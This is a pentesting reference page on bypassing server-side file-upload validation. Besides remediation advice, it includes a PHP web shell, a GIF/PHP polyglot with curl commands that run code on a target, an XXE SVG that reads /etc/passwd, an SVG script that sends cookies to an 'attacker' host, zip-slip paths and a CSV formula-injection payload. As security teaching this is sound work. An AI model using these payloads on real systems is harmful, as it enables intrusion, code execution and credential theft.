# File Upload Bypass

> Server-side validation of uploaded files is one of the most error-prone surfaces. Common goal: land a web shell, achieve RCE, or store XSS via SVG/HTML. Authorized testing only. Map: OWASP WSTG-BUSL-09, CWE-434.

## TL;DR
- Three validation surfaces an app might check: extension, MIME / Content-Type, magic bytes. Each is bypassable independently.
- Even with all three correct, uploaded files in a path that the web server serves with PHP/JSP/ASPX execution → RCE.
- SVG uploads are XXE + XSS; HTML uploads are stored XSS; PDF uploads are stored XSS / SSRF when rendered.
- Defence: filename + content validation + storage outside doc-root + serve via controlled endpoint with explicit `Content-Disposition: attachment` + sandbox `Content-Security-Policy`.

## Detection / Discovery

### Identify the upload feature(s)
- Profile picture, document attachment, CSV import, logo, signature, resume.
- Note: HTML form `enctype="multipart/form-data"` is the usual; some apps use base64-in-JSON.
- Check whether re-encoded (server-side resize for images) — re-encoding kills smuggled bytes.

### Confirm what's enforced
| Validation | How to test |
| --- | --- |
| Extension blocklist | Try `.php`, `.php3`, `.php5`, `.phtml`, `.phar`, `.pht`, `.jsp`, `.aspx`, `.asp`. |
| Extension allow-list | Try double extension: `shell.jpg.php`, `shell.php%00.jpg`, `shell.php.jpg`. |
| MIME / Content-Type | Send `Content-Type: image/png` for a `.php` body. |
| Magic bytes | Prefix payload with `GIF89a` / `\x89PNG\r\n\x1a\n` / `%PDF-`. |
| Filesize | Check max size; tiny PHP webshells fit in <100 B. |
| Server-side re-encoding | If image is resized → smuggling killed; try EXIF / IDAT chunk that survives re-encoding (rare). |

## Exploitation

### Classic — PHP web shell
```php
<?php system($_GET['c']); ?>
```
Variants on filename:
- `shell.php` — works if no validation.
- `shell.phtml` / `.php3` / `.php5` / `.php7` / `.phar` / `.pht` — bypass blocklists missing variants.
- `shell.PhP` — case-sensitive blocklist bypass.
- `shell.php.jpg` — Apache's `AddHandler php5-script .php` may treat anything containing `.php` as PHP (CVE-class config).
- `shell.php;.jpg` — IIS 6 / Tomcat parsing quirks.
- `shell.php%00.jpg` — null-byte (legacy PHP < 5.3.4).
- `shell.jpg/.php` (path traversal in extension).
- `shell.php .` (trailing dot — Windows strips it on save).

### Magic-byte bypass
```bash
# Build a "polyglot" GIF + PHP
echo -ne 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.gif
# Upload as image, then if server interprets it as PHP at some path (LFI / Apache misconfig)…
curl "https://target/uploads/shell.gif?c=id"   # only if server treats .gif as PHP
# More commonly chained with LFI:
curl "https://target/index.php?lang=./uploads/shell.gif&c=id"
```
See [./lfi-rfi.md](./lfi-rfi.md) for LFI-chain.

### Content-Type bypass
Burp Repeater: change `Content-Type: application/x-php` → `image/png` and try `.php` filename. If MIME-only validation, accepted.

### Server-Side Request Forgery via SVG / XML
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20"><![CDATA[&xxe;]]></text>
</svg>
```
Server-side render → XXE file read. See [./xxe.md](./xxe.md).

### Stored XSS via SVG
SVG is XML + JS:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>fetch('https://attacker/'+document.cookie)</script>
</svg>
```
If uploaded SVG is served with `Content-Type: image/svg+xml` from the app origin → XSS fires on every viewer.

### HTML upload as stored XSS
Uploading `.html` / `.htm` / `.svg` served from the app origin → arbitrary same-origin script. Many apps reject `.html` but allow `.svg`.

### Archive bomb / zip-slip
- Zip-bomb: `42.zip` (decompresses to PB) → DoS.
- Zip-slip: archive containing `../../../etc/cron.d/x` extracts outside upload dir if extractor doesn't normalize paths (CWE-22 + CWE-434 chain).

### CSV / spreadsheet injection
User-supplied CSV with `=cmd|'/c calc'!A1` → Excel/LibreOffice executes on open. CWE-1236.

### Image-parser exploits (rare but catastrophic)
- ImageMagick `MSL` / `MVG` (ImageTragick CVE-2016-3714).
- libvips / Pillow path traversal in `.ico` parsing (various CVEs over years).
- Check the server-side image library version against CVEs.

## Bypasses (against layered defences)
- Extension allow-list + magic-byte check + re-encode → very hard to RCE; pivot to stored-XSS via re-encoded SVG (some libs preserve `<script>` blocks).
- Filename sanitiser strips dots but accepts UTF-8 lookalikes: `shell.php`, `shell。php` (ideographic full-stop).
- Server scans first 512 bytes for magic — append payload after 512-byte prefix in a polyglot.
- File stored under random UUID name → can't predict URL. Find via directory listing on the upload bucket, or via the response body returning the upload path.

## Defence / Remediation
- **Allow-list** of extensions + content-types + magic-byte signatures. All three together.
- **Re-encode** images server-side (Pillow / Sharp / ImageMagick) — strips smuggled bytes and arbitrary metadata. Most effective single control.
- **Strip ICC profiles / EXIF / IPTC / XMP** on images to prevent metadata abuse + privacy leak.
- **Store outside the document root**; serve via a controlled endpoint that sets `Content-Disposition: attachment` and a strict `Content-Type` (no sniffing: `X-Content-Type-Options: nosniff`).
- **Disable script execution** under upload directory at the web-server layer (`<Files *.php>Require all denied</Files>` in Apache; `location ~ /uploads { … return 404 for *.php*; }` in nginx).
- **Generate randomised filenames** server-side (don't trust user-supplied names for storage paths).
- **Magic-byte check via positive list**, not blocklist. Read the bytes after upload, not the client-supplied `Content-Type`.
- **Sandbox image processing** in a separate process / container with no network access (mitigates ImageTragick-class).
- **Filesize cap** + total per-user quota.
- **SVG**: either reject outright or convert to PNG before serving. If serving SVG, set `Content-Disposition: attachment`.
- **CSV exports** going back to users — sanitise leading `=`, `+`, `-`, `@`, tab, CR.
- **Antivirus scan** as a backstop (ClamAV); not a primary defence.

## Sources
- OWASP WSTG-BUSL-09 Test Upload of Unexpected File Types: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Unexpected_File_Types
- OWASP Cheat Sheet — File Upload: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PortSwigger — File upload vulnerabilities: https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings Upload Insecure Files: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- HackTricks file upload: https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
- CWE-434 Unrestricted Upload of File with Dangerous Type: https://cwe.mitre.org/data/definitions/434.html
- ImageTragick (CVE-2016-3714): https://imagetragick.com/
